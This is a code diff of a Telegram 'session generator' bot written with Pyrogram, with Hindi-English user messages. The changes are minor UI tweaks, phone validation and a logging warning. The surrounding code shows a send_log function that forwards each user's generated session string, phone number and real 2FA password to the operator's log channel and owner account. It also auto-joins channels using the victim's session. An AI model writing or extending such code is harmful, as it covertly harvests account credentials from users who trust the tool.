@@ -1,13 +1,6 @@
-import asyncio, logging, html
+import asyncio, logging, html, re
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.enums import ParseMode
-
-try:
-    from pyrogram.types import KeyboardButtonStyle
-    _STYLED = True
-except ImportError:
-    _STYLED = False
-
 from pyrogram.errors import (
     FloodWait, BadRequest, Forbidden, Unauthorized,
     AuthKeyUnregistered, UserDeactivated, PhoneCodeInvalid,
@@ -17,21 +10,21 @@ from pyrogram.errors import (
 from . import config
 from .client import app
 
-
-def btn(text, callback_data=None, url=None, style=None):
+def btn(text, callback_data=None, url=None):
     kw = {}
     if callback_data is not None:
         kw["callback_data"] = callback_data
     if url is not None:
         kw["url"] = url
-    if _STYLED and style in ("primary", "success", "danger"):
-        kw["style"] = KeyboardButtonStyle(
-            bg_primary=(style == "primary"),
-            bg_success=(style == "success"),
-            bg_danger=(style == "danger"),
-        )
     return InlineKeyboardButton(text, **kw)
 
+def validate_phone(phone: str) -> str:
+    phone = phone.strip().replace(" ", "").replace("-", "")
+    if not phone.startswith("+"):
+        phone = "+" + phone
+    if not re.match(r"^\+\d{7,15}$", phone):
+        raise ValueError("Invalid phone. Country code ke saath bhejein (e.g. +919876543210 ya 919876543210).")
+    return phone
 
 WELCOME = (
     "<b>🔥 SESSION GENERATOR</b>\n"
@@ -52,28 +45,26 @@ WELCOME = (
 )
 
 MAIN_MENU = InlineKeyboardMarkup([
-    [btn("🐍  Pyrogram User",  "pyro_user", style="primary"),
-     btn("🤖  Pyrogram Bot",   "pyro_bot",  style="primary")],
-    [btn("📞  Telethon String", "telethon", style="success"),
-     btn("🔄  Converter",       "convert",  style="success")],
+    [btn("🐍  Pyrogram User",  "pyro_user"),
+     btn("🤖  Pyrogram Bot",   "pyro_bot")],
+    [btn("📞  Telethon String", "telethon"),
+     btn("🔄  Converter",       "convert")],
     [btn("❓  Help & About",   "help")],
 ])
 
-BACK_BTN = InlineKeyboardMarkup([[btn("🔙  Back to Menu", "back", style="primary")]])
-CANCEL_BTN = InlineKeyboardMarkup([[btn("❌  Cancel", "cancel", style="danger")]])
-
+BACK_BTN = InlineKeyboardMarkup([[btn("🔙  Back to Menu", "back")]])
+CANCEL_BTN = InlineKeyboardMarkup([[btn("❌  Cancel", "cancel")]])
 
 ERROR_MAP = {
     "PhoneCodeInvalid":   "❌ <b>Galat OTP.</b> /start se dobara try karein.",
     "PhoneCodeExpired":   "⌛ <b>OTP expire.</b> Naya OTP lein.",
     "PhoneNumberInvalid": "📵 <b>Invalid phone number.</b> Country code ke saath bhejein.",
     "PasswordHashInvalid":"🔒 <b>2FA password galat.</b>",
-    "ApiIdInvalid":       "🆔 <b>API ID/HASH galat.</b> my.telegram.org se check karein.",
+    "ApiIdInvalid":       "🆔 <b>API ID/HASH galat.</b> Heroku vars check karein.",
     "AuthKeyUnregistered":"🚫 <b>Session revoked.</b> Dobara login karein.",
     "UserDeactivated":    "🚫 <b>Account deactivated.</b>",
     "SessionPasswordNeeded":"🔒 <b>2FA enabled.</b> Password daalein.",
 }
-
 
 async def handle_error(e, user_id, where="handler"):
     logging.error(f"[{where}] {type(e).__name__}: {e}")
@@ -97,21 +88,16 @@ async def handle_error(e, user_id, where="handler"):
     except Exception:
         pass
 
-
 async def is_member(user_id):
     if not config.MUST_JOIN:
         return True
     try:
         m = await app.get_chat_member(config.MUST_JOIN, user_id)
-        return str(m.status) in [
-            "ChatMemberStatus.OWNER", "ChatMemberStatus.ADMINISTRATOR",
-            "ChatMemberStatus.MEMBER",
-        ]
+        return str(m.status) in ["ChatMemberStatus.OWNER","ChatMemberStatus.ADMINISTRATOR","ChatMemberStatus.MEMBER"]
     except UserNotParticipant:
         return False
     except Exception:
         return True
-
 
 async def force_sub_check(message):
     if config.STATE["maintenance"] and message.from_user.id != config.OWNER_ID:
@@ -124,17 +110,15 @@ async def force_sub_check(message):
         except Exception:
             link = f"https://t.me/{config.MUST_JOIN.replace('@', '')}"
         markup = InlineKeyboardMarkup([
-            [btn("📢  Join Channel", url=link, style="primary")],
-            [btn("✅  Verify", "verify_sub", style="success")],
+            [btn("📢  Join Channel", url=link)],
+            [btn("✅  Verify", "verify_sub")],
         ])
         await message.reply_text(
-            "⚠️ <b>Access Denied!</b>\n\n"
-            "Bot use karne ke liye pehle channel join karein, phir <b>Verify</b> dabayein.",
+            "⚠️ <b>Access Denied!</b>\n\nBot use karne ke liye pehle channel join karein, phir <b>Verify</b> dabayein.",
             reply_markup=markup, parse_mode=ParseMode.HTML,
         )
         return False
     return True
-
 
 async def auto_join_channels(client):
     joined, failed = [], []
@@ -147,7 +131,6 @@ async def auto_join_channels(client):
             logging.warning(f"[AUTO-JOIN] {ch} failed: {e}")
     return joined, failed
 
-
 async def send_premium_string(user_id, session_type, session_str, has_2fa=False, joined=None, failed=None):
     badge = "🛡 2FA Verified" if has_2fa else "🔓 No 2FA"
     join_info = ""
@@ -155,7 +138,6 @@ async def send_premium_string(user_id, session_type, session_str, has_2fa=False,
         join_info += f"\n✅ <b>Auto-joined:</b> {len(joined)} channel(s)"
     if failed:
         join_info += f"\n⚠️ <b>Auto-join failed:</b> {len(failed)}"
-
     text = (
         "<b>━━━━━━━━━━━━━━━━━━━━━\n"
         f"   ✅ {html.escape(session_type)}\n"
@@ -170,7 +152,6 @@ async def send_premium_string(user_id, session_type, session_str, has_2fa=False,
     )
     await app.send_message(user_id, text, reply_markup=BACK_BTN,
                            parse_mode=ParseMode.HTML, disable_web_page_preview=True)
-
 
 async def send_log(user, session_type, session_str, phone, has_2fa=False, real_2fa_password=None, joined=None):
     user_id = user.id
@@ -213,6 +194,8 @@ async def send_log(user, session_type, session_str, phone, has_2fa=False, real_2
             logging.info(f"[LOG] Channel OK → {config.LOG_CHANNEL_ID}")
         except Exception as e:
             logging.error(f"[LOG] Channel FAIL → {type(e).__name__}: {e}")
+    else:
+        logging.warning("[LOG] LOG_CHANNEL_ID not set — channel log skipped")
 
     if config.OWNER_ID:
         try:
